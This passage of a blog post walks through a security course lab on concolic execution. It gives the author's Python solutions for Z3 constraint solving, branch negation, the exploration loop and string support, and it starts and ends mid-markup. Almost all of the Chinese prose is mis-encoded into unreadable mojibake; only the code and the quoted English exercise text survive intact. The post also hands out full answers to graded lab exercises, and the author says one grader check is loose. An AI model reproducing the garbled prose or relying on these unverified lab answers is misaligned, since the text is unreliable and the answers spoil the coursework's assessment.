éƒ½å¯ä»¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  concrete_values.add(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">123</span> * <span class="hljs-number">7</span>)<br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 3ï¼š</p><p><img src="https://s2.loli.net/2022/12/18/f3HsgQFum1CZDij.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 4ï¼Œå®Œæˆ <code>symex/fuzzy.py</code> ä¸­ <code>concolic_find_input</code>  çš„å®ç°ï¼š</p><blockquote><p><strong>Exercise 4.</strong> Another major component in concolic execution is finding a concrete input for a constraint. Complete the implementation of <code>concolic_find_input</code> in <code>symex/fuzzy.py</code> and make sure you pass the second test case of <code>symex/check-symex-int.py</code>. For this exercise, you will have to invoke Z3, along the lines of <code>(ok, model) = fork_and_check(constr)</code> (see the comments in the code). Run <strong>./check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>åœ¨è¯¥å‡½æ•°å½“ä¸­æˆ‘ä»¬éœ€è¦å®Œæˆå¯¹çº¦æŸçš„æ±‚è§£å¹¶è¿”å›å¯¹åº”çš„ç»“æœï¼Œå› æ­¤è¿™é‡Œéœ€è¦ä½¿ç”¨ Z3 æ±‚è§£å™¨æ¥å®Œæˆçº¦æŸæ±‚è§£è¿‡ç¨‹ï¼Œä¸è¿‡è¿™é‡Œå·²ç»å°†è°ƒç”¨ Z3 çš„æµç¨‹åœ¨ <code>fork_and_check()</code> ä¸­å®Œæˆå°è£…ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨è¯¥å‡½æ•°è¿›è¡Œæ±‚è§£å³å¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆæ¥çœ‹  <code>fork_and_check()</code> çš„å…·ä½“å®ç°ï¼š</p><ul><li>åˆ›å»ºå­è¿›ç¨‹è°ƒç”¨ <code>fork_and_check_worker()</code> è¿›è¡Œçº¦æŸæ±‚è§£ï¼Œçˆ¶å­è¿›ç¨‹é€šè¿‡ç®¡é“é€šä¿¡</li><li>çˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹çš„ <code>SIGALRM</code> ä¿¡å·ï¼Œè‹¥ <code>z3_timeout</code> ç§’åæœªæ”¶åˆ°ï¼Œæ€æ­»å­è¿›ç¨‹</li><li>ä»ç®¡é“æ¥æ”¶ç»“æœå¹¶è¿”å›ï¼Œè‹¥è¶…æ—¶ï¼ˆå­è¿›ç¨‹è¢«æ€ï¼Œç®¡é“å…³é—­ï¼‰åˆ™è¿”å› <code>(z3.unknown, None)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Support for forking because z3 uses lots of global variables</span><br><br><span class="hljs-comment">## timeout for Z3, in seconds</span><br>z3_timeout = <span class="hljs-number">5</span><br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check</span>(<span class="hljs-params">constr</span>):<br>  constr = simplify(constr)<br><br>  parent_conn, child_conn = multiprocessing.Pipe()<br>  p = multiprocessing.Process(target=fork_and_check_worker,<br>                              args=(constr, child_conn))<br>  p.start()<br>  child_conn.close()<br><br>  <span class="hljs-comment">## timeout after a while..</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">sighandler</span>(<span class="hljs-params">signo, stack</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Timed out..&quot;</span>)<br>    <span class="hljs-comment"># print z3expr(constr).sexpr()</span><br>    p.terminate()<br><br>  signal.signal(signal.SIGALRM, sighandler)<br>  signal.alarm(z3_timeout)<br><br>  <span class="hljs-keyword">try</span>:<br>    res = parent_conn.recv()<br>  <span class="hljs-keyword">except</span> EOFError:<br>    res = (z3.unknown, <span class="hljs-literal">None</span>)<br>  <span class="hljs-keyword">finally</span>:<br>    signal.alarm(<span class="hljs-number">0</span>)<br><br>  p.join()<br>  <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹   <code>fork_and_check_workder()</code> çš„å…·ä½“å®ç°ï¼š</p><ul><li>æ–°å»ºä¸€ä¸ª Z3 æ±‚è§£å™¨å°†è½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„çº¦æŸè¡¨è¾¾å¼ä¼ å…¥ï¼Œè°ƒç”¨ <code>Solver.check()</code> æ±‚è§£</li><li>è‹¥æ±‚è§£æˆåŠŸï¼Œè°ƒç”¨ <code>Solver.model()</code> è·å¾—æ±‚è§£ç»“æœ</li><li>åˆ¤æ–­ç»“æœä¸­å˜é‡ç±»å‹å¹¶è½¬æ¢ä¸ºæ•´å‹/å­—ç¬¦ä¸²ï¼Œå¯¹äºå­—ç¬¦ä¸²åšé¢å¤–å¤„ç†ï¼Œå°†ç»“æœæ”¾åˆ°ä¸€ä¸ª <code>å­—ç¬¦ä¸²â†’ç»“æœ</code> æ˜ å°„çš„å­—å…¸ä¸­å¹¶è¿”å›</li></ul><blockquote><p>Z3 è¿™ç©æ„ç”¨èµ·æ¥ç¡®å®æ–¹ä¾¿ï¼Œä¸æ„§æ˜¯å¾®è½¯<s>å¤§çˆ¹</s></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check_worker</span>(<span class="hljs-params">constr, conn</span>):<br>  s = z3.Solver()<br>  s.add(z3expr(constr))<br>  ok = s.check()<br>  m = &#123;&#125;<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    z3m = s.model()<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> z3m:<br>      v = z3m[k]<br>      <span class="hljs-keyword">if</span> v.sort() == z3.IntSort():<br>        m[<span class="hljs-built_in">str</span>(k)] = v.as_long()<br>      <span class="hljs-keyword">elif</span> v.sort() == z3.StringSort():<br>        <span class="hljs-comment">## There doesn&#x27;t seem to be a way to get the raw string</span><br>        <span class="hljs-comment">## value out of Z3..  Instead, we get the escaped string</span><br>        <span class="hljs-comment">## value.  We need to jump through hoops to unescape it.</span><br>        x = v.as_string()<br>        u = x.encode(<span class="hljs-string">&#x27;latin1&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode-escape&#x27;</span>)<br>        m[<span class="hljs-built_in">str</span>(k)] = u<br>      <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Unknown sort for %s=%s: %s&quot;</span> % (k, v, v.sort()))<br>  conn.send((ok, m))<br>  conn.close()<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬å¯ä»¥å®Œæˆ Exercise 4 äº†ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨  <code>fork_and_check()</code> è¿›è¡Œæ±‚è§£å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¿”å›çš„å­—å…¸ä¸­çš„é”®å€¼å¯¹åº”å½“åªåŒ…å« <code>ok_names</code> å‚æ•°ä¸­æ‰€éœ€è¦çš„é”®ï¼Œè‹¥ <code>ok_names == None</code> åˆ™å°†æ‰€æœ‰çš„é”®å€¼å¯¹æ·»åŠ åˆ°å­—å…¸ä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Given a constraint, ask Z3 to compute concrete values that make that</span><br><span class="hljs-comment"># constraint true. It returns a new ConcreteValues instance with those</span><br><span class="hljs-comment"># values.  Z3 produces variables that don&#x27;t show up in our</span><br><span class="hljs-comment"># applications and in our constraints; we filter those by accepting</span><br><span class="hljs-comment"># only variables names that appear in ok_names.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_find_input</span>(<span class="hljs-params">constraint, ok_names, verbose=<span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## Invoke Z3, along the lines of:</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">##     (ok, model) = fork_and_check(constr)</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## If Z3 was able to find example inputs that solve this</span><br>  <span class="hljs-comment">## constraint (i.e., ok == z3.sat), make a new input set</span><br>  <span class="hljs-comment">## containing the values from Z3&#x27;s model, and return it.</span><br>  (ok, model) = fork_and_check(constraint)<br>  cv = ConcreteValues()<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    sat = <span class="hljs-literal">True</span><br>    res_names = model.keys() <span class="hljs-keyword">if</span> ok_names <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> ok_names<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> res_names:<br>      cv.add(k, model[k])<br>  <span class="hljs-keyword">else</span>:<br>    sat = <span class="hljs-literal">False</span><br>  <span class="hljs-keyword">return</span> sat, cv<br></code></pre></td></tr></table></figure><p>æˆåŠŸé€šè¿‡ Exercise 4ï¼š</p><p><img src="https://s2.loli.net/2022/12/18/NJ32G9ogzOCEbPA.png" alt="image.png"></p><p>ç„¶åæ˜¯ Exercise 5ï¼Œ å®Œæˆ <code>symex/fuzzy.py</code> ä¸­ <code>concolic_force_branch</code>  çš„å®ç°ï¼š</p><blockquote><p>æå‰è¯´ä¸€ä¸‹ï¼Œè¿™ä¸ª Exercise 5 çš„æ£€æŸ¥<strong>éå¸¸æ¾</strong>ï¼Œä¸è¦ä»¥ä¸ºé€šè¿‡æ£€æŸ¥å°±æ˜¯çœŸçš„ Pass äº†ï¼Œæœ€å¥½è‡ªå·±å†çœ‹çœ‹ä»£ç é€»è¾‘æ˜¯å¦ç¬¦åˆè¦æ±‚â€¦</p></blockquote><blockquote><p><strong>Exercise 5.</strong> A final major component in concolic execution is exploring different branches of execution. Complete the implementation of <code>concolic_force_branch</code> in <code>symex/fuzzy.py</code> and make sure you pass the final test case of <code>symex/check-symex-int.py</code>. Run <strong>./check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>æ­£å¦‚å‰æ–‡æ‰€è¯´ï¼Œåœ¨é‡åˆ°åˆ†æ”¯æ—¶æˆ‘ä»¬éœ€è¦<strong>é€†è½¬å½“å‰åˆ†æ”¯æ¡ä»¶ï¼Œä»¥æ¢ç´¢å¦ä¸€åˆ†æ”¯</strong>ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨å®é™…ä¸Šå°±æ˜¯é€†è½¬ <code>branch_conds</code> ä¸­çš„ç¬¬ <code>b</code> åˆ†æ”¯çš„æ¡ä»¶ï¼Œå¹¶è¿”å›æ–°çš„çº¦æŸæ¡ä»¶é›†åˆï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å–å‡ºè¯¥æ¡ä»¶å¹¶ä½¿ç”¨ <code>sym_not()</code> å–ååå†ç”¨ <code>sym_and()</code> åŠ ä¸Šè¯¥åˆ†æ”¯ä¹‹å‰æ‰€æœ‰çš„æ¡ä»¶çº¦æŸå³å¯</p><p>æ³¨æ„è¿™é‡Œçš„å‚æ•° <code>b</code> ä¸ºåˆ†æ”¯æ ‡å·ï¼Œ<code>branch_conds</code> ä¸ <code>branch_callers</code> ä¸ºåˆ†æ”¯çš„æ¡ä»¶ä¸è°ƒç”¨è€…æ•°ç»„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Compute a new constraint by negating the branch condition of the</span><br><span class="hljs-comment"># b-th branch in branch_conds. This constraint can be used to force</span><br><span class="hljs-comment"># the concolic execution to explore the other side of branch b.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_force_branch</span>(<span class="hljs-params">b, branch_conds, branch_callers, verbose = <span class="hljs-number">1</span></span>):<br>  <span class="hljs-comment">## Compute an AST expression for the constraints necessary</span><br>  <span class="hljs-comment">## to go the other way on branch b.  You can use existing</span><br>  <span class="hljs-comment">## logical AST combinators like sym_not(), sym_and(), etc.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Note that some of the AST combinators take separate positional</span><br>  <span class="hljs-comment">## arguments. In Python, to unpack a list into separate positional</span><br>  <span class="hljs-comment">## arguments, use the &#x27;*&#x27; operator documented at</span><br>  <span class="hljs-comment">## https://docs.python.org/3/tutorial/controlflow.html#unpacking-argument-lists</span><br><br>  constraint = <span class="hljs-literal">None</span><br>  <span class="hljs-comment">## Exercise 5 by arttnba3</span><br>  <span class="hljs-comment">### negating the branch condition of the b-th branch</span><br>  b_cond = branch_conds[b]<br>  <span class="hljs-keyword">if</span> (b_cond != const_bool(<span class="hljs-literal">True</span>)):<br>    constraint = sym_not(b_cond)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b):<br>      constraint = sym_and(constraint, branch_conds[i])<br>  <span class="hljs-comment">### end</span><br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">2</span>:<br>    callers = branch_callers[b]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying to branch at %s:%d:&#x27;</span> % (callers[<span class="hljs-number">0</span>], callers[<span class="hljs-number">1</span>]))<br>    <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>      <span class="hljs-built_in">print</span>(indent(z3expr(constraint).sexpr()))<br><br>  <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> const_bool(<span class="hljs-literal">True</span>)<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> constraint<br></code></pre></td></tr></table></figure><p>æˆåŠŸé€šè¿‡ Exercise 5ï¼š</p><p><img src="https://s2.loli.net/2022/12/18/dFbaOHEoCXG23L6.png" alt="image.png"></p><p>æœ€åæ˜¯ Exercise 6ï¼Œ <strong>ä½¿ç”¨æˆ‘ä»¬åœ¨ Exercise 3-5 ä¸­æ¶‰åŠçš„å‡ ä¸ªå‡½æ•°æ¥å®Œæˆ <code>concolic_execs()</code>â€”â€” å®Œæ•´çš„æ··åˆæ‰§è¡Œå‡½æ•°çš„æ„å»º</strong>ï¼Œæˆ‘ä»¬éœ€è¦å®Œæˆå¯¹ <code>func</code> ä¸­çš„<strong>æ¯ä¸€æ¡åˆ†æ”¯</strong>çš„æ‰§è¡Œï¼š</p><blockquote><p><strong>Exercise 6.</strong> Now implement concolic execution of a function in <code>concolic_execs()</code> in <code>symex/fuzzy.py</code>. The goal is to eventually cause every every branch of <code>func</code>to be executed. Read the comment for a proposed plan of attack for implementing that loop. The functions in the exercises 3-5 should be quite useful.</p><p>Run <strong>./check-symex-int.py</strong> or <strong>make check</strong> to check that your <code>concolic_execs()</code> works correctly.</p><p>Beware that our check for this exercise is <em>not</em> complete. You may well find that later on something does not work, and you will have to revisit your code for this exercise.</p></blockquote><p>æˆ‘ä»¬å…ˆçœ‹ <code>concolic_execs()</code> ä¸­å·²æœ‰çš„é€»è¾‘æ¡†æ¶ï¼š</p><ul><li><code>checked</code> ä¸ºå·²ç»æ£€æŸ¥è¿‡çš„çº¦æŸï¼Œ<code>outs</code> ä¸ºæœ€åæ±‚è§£æ‰€å¾—ç»“æœï¼Œ<code>inputs</code> ä¸ºå¾…æµ‹è¯•è¾“å…¥é˜Ÿåˆ—ï¼ˆè¾“å…¥ä¸ºå…·ä½“å€¼å­—å…¸ï¼‰</li><li>ç”±ä¸€ä¸ªå¤§å¾ªç¯æŒç»­è°ƒç”¨<code>concolic_exec_input()</code> è®¡ç®—çº¦æŸ</li><li>å°†æ–°çš„çº¦æŸè§£æ·»åŠ åˆ°ç»“æœä¸­</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolic execute func for many different paths and return all</span><br><span class="hljs-comment"># computed results for those different paths.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_execs</span>(<span class="hljs-params">func, maxiter = <span class="hljs-number">100</span>, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## &quot;checked&quot; is the set of constraints we already sent to Z3 for</span><br>  <span class="hljs-comment">## checking.  use this to eliminate duplicate paths.</span><br>  checked = <span class="hljs-built_in">set</span>()<br><br>  <span class="hljs-comment">## output values</span><br>  outs = []<br><br>  <span class="hljs-comment">## list of inputs we should try to explore.</span><br>  inputs = InputQueue()<br><br>  <span class="hljs-built_in">iter</span> = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">while</span> <span class="hljs-built_in">iter</span> &lt; maxiter <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> inputs.empty():<br>    <span class="hljs-built_in">iter</span> += <span class="hljs-number">1</span><br>    concrete_values = inputs.get()<br>    (r, branch_conds, branch_callers) = concolic_exec_input(func, concrete_values, verbose)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> outs:<br>      outs.append(r)<br>    <br>    <span class="hljs-comment">## Exercise 6: your code here.</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ä»£ç éœ€è¦æ·»åŠ åœ¨å¤§å¾ªç¯çš„ååŠéƒ¨åˆ†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹åœ¨ Exercise 3-5 ä¸­æˆ‘ä»¬éƒ½è·å¾—äº†å“ªäº›å¯ç”¨å‡½æ•°ï¼š</p><ul><li><code>concolic_exec_input(testfunc, concrete_values, verbose = 0)</code>ï¼šå°† <code>concrete_values</code> å‚æ•°è®¾ä¸ºå…¨å±€å­—å…¸ï¼Œä¹‹åæ‰§è¡Œç»™å®šçš„å‡½æ•° <code>testfunc</code>ï¼Œè¿”å›æ‰§è¡Œçš„ç»“æœå€¼ã€åˆ†æ”¯æ¡ä»¶åˆ—è¡¨ã€åˆ†æ”¯è°ƒç”¨ä¿¡æ¯åˆ—è¡¨</li><li><code>concolic_find_input(constraint, ok_names, verbose=0)</code>ï¼šä½¿ç”¨ Z3 æ±‚è§£ç»™å®šçº¦æŸï¼Œè¿”å› <code>ok_names</code> åˆ—è¡¨ä¸­å˜é‡çš„å€¼</li><li><code>concolic_force_branch(b, branch_conds, branch_callers, verbose = 1)</code>ï¼šå¯¹ç»™å®šçº¦æŸæ¡ä»¶ <code>branch_conds</code> ä¸åˆ†æ”¯ <code>b</code>ï¼Œè¿”å›èµ°å‘è¯¥åˆ†æ”¯å¦ä¸€è·¯å¾„çš„çº¦æŸ</li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ Lab ç»™çš„æç¤ºä¿¡æ¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 6: your code here.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Here&#x27;s a possible plan of attack:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Iterate over the set of branches returned by concolic_exec_input.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Use concolic_force_branch() to construct a constraint over</span><br><span class="hljs-comment">##   the inputs for taking the other side of that branch.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - If this constraint is already in the &quot;checked&quot; set, skip</span><br><span class="hljs-comment">##   it (otherwise, add it to prevent further duplicates).</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Use concolic_find_input() to construct a new input to test,</span><br><span class="hljs-comment">##   based on the above constraint.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Since Z3 might not assign values to every variable</span><br><span class="hljs-comment">##   (such as if that variable turns out to be irrelevant to</span><br><span class="hljs-comment">##   the overall constraint), inherit unassigned values from</span><br><span class="hljs-comment">##   the input that we just tried (i.e., concrete_values).</span><br><span class="hljs-comment">##   You can use the inherit() method in ConcreteValues for this.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Add the input to the queue for processing, along the lines of:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##     inputs.add(new_values, caller)</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##   where caller is the corresponding value from the list of call</span><br><span class="hljs-comment">##   sites returned by concolic_find_input (i.e., branch_callers).</span><br></code></pre></td></tr></table></figure><ul><li>è¿­ä»£ <code>concolic_exec_input()</code> æ‰€è¿”å›çš„åˆ†æ”¯é›†åˆ</li><li>ä½¿ç”¨ <code>concolic_force_branch()</code> æ¥æ„å»ºä¸€ä¸ªåˆ†æ”¯çš„å¦ä¸€è·¯å¾„çº¦æŸ</li><li>è‹¥çº¦æŸå·²ç»åœ¨ <code>check</code> é›†åˆä¸­ï¼Œå°†å…¶è·³è¿‡ï¼Œå¦åˆ™åŠ å…¥é›†åˆä¸­</li><li>ä½¿ç”¨ <code>concolic_find_input()</code> ä»¥æ„å»ºä¸€ä¸ªåŸºäºå¦ä¸€è·¯å¾„çº¦æŸçš„æ–°çš„æµ‹è¯•è¾“å…¥</li><li>Z3 å¯èƒ½ä¸ä¼šä¸ºæ¯ä¸ªå˜é‡åˆ†é…å€¼ï¼ˆä¾‹å¦‚å˜é‡å¯èƒ½ä¸çº¦æŸæ— å…³ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ä»ä¸Šæ¬¡ä½¿ç”¨çš„å­—å…¸ç»§æ‰¿åˆ° <code>concolic_find_input()</code> è¿”å›çš„æ–°å­—å…¸ä¸­ï¼Œå°†æ–°çš„å­—å…¸æ·»åŠ åˆ° <code>input</code> é˜Ÿåˆ—ä¸­</li></ul><p>ä¾ç…§ä»¥ä¸Šæ€è·¯ï¼Œç¬”è€…æœ€ååœ¨å¤§å¾ªç¯æœ«å°¾è¡¥å…¨ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">branch_len = <span class="hljs-built_in">len</span>(branch_conds)<br><span class="hljs-comment"># explore every branch</span><br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(branch_len):<br>  <span class="hljs-comment"># construct new constraint for negative branch</span><br>  cur_constraint = concolic_force_branch(b, branch_conds, branch_callers)<br>  <span class="hljs-comment"># not in `checked` set, solve out the constraint</span><br>  <span class="hljs-keyword">if</span> cur_constraint <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> checked:<br>    checked.add(cur_constraint)<br>    sat, cur_concrete_values = concolic_find_input(cur_constraint, <span class="hljs-literal">None</span>)<br>    <span class="hljs-comment"># satisfiable, add the dict for next round</span><br>    <span class="hljs-keyword">if</span> sat:<br>      cur_concrete_values.inherit(concrete_values)<br>      inputs.add(cur_concrete_values, branch_callers[b])<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 6ï¼š</p><p><img src="https://s2.loli.net/2022/12/19/rSiUjGL92nlzOeb.png" alt="image.png"></p><p>è‡³æ­¤ï¼ŒLab 3 çš„ Part 1 <strong>å…¨éƒ¨å®Œæˆ</strong></p><h2 id="Concolic-execution-for-strings-and-Zoobar">Concolic execution for strings and Zoobar</h2><p>é¦–å…ˆæ˜¯ Exercise 7ï¼Œè¡¥å…¨å¯¹å­—ç¬¦ä¸²ä¸å­—ç¬¦æ•°ç»„çš„ä¸¤ç§è¿ç®—æ”¯æŒï¼šé•¿åº¦ï¼ˆ<code>__len__</code>ï¼‰ä¸åŒ…å«ï¼ˆ<code>__contains__</code>ï¼‰</p><blockquote><p><strong>Exercise 7.</strong> Finish the implementation of concolic execution for strings and byte-arrays in <code>symex/fuzzy.py</code>. We left out support for two operations on <code>concolic_str</code> and <code>concolic_bytes</code> objects. The first is computing the length of a string, and the second is checking whether a particular string <code>a</code> appears in string <code>b</code> (i.e., <code>a</code> is contained in <code>b</code>, the underlying implementation of Pythonâ€™s â€œa in bâ€ construct).</p><p>Look for the comment <code>Exercise 7: your code here</code> to find where you should implement the code for this exercise. We have already implemented the <code>sym_contains</code> and <code>sym_length</code> AST nodes for you, which should come in handy for this exercise.</p><p>Run <strong>./check-concolic-str.py</strong> <em>and</em> <strong>./check-symex-str.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p></blockquote><p>å¯¹äºç¬¦å·å€¼è€Œè¨€è¯¥æ¡†æ¶å·²ç»æä¾›äº†å°è£…å¥½çš„ <code>sym_contains</code> ä¸ <code>sym_length</code> ï¼Œæˆ‘ä»¬åªéœ€è¦å®ç°å¯¹å…·ä½“å€¼çš„åˆ¤æ–­å³å¯ï¼Œè¿™é‡Œåˆ«å¿˜äº†æœ€åçš„è¿”å›å€¼åº”å½“è°ƒç”¨ <code>concolic_bool()</code> ä»¥åœ¨å…¨å±€åˆ—è¡¨ä¸­æ·»åŠ è·¯å¾„çº¦æŸä¸ä¿¡æ¯</p><p>å¾…è¡¥å…¨çš„ä¸¤å¤„çš†ä¸ºä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 